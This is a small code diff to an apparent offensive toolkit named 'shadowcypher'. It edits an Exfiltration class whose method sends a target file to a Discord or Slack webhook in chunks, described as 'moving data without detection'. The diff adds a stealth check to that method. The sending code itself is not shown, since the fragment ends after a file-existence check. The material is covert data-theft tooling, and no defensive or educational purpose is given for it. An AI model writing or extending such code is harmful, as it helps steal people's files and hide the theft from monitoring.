@@ -7,6 +7,7 @@ import os
 import requests
 import base64
 from shadowcypher.core.logger import logger
+from shadowcypher.core.stealth import require_stealth
 
 class Exfiltration:
     """The 'Extractor' of the suite. Moving data without detection."""
@@ -14,6 +15,7 @@ class Exfiltration:
     @staticmethod
     def exfiltrate_via_webhook(webhook_url, filepath, on_output=None):
         """Send a file to a Discord/Slack webhook in chunks."""
+        require_stealth(on_output=on_output)
         if not os.path.exists(filepath):
             return f"[ERROR] FILE_NOT_FOUND: {filepath}"
         
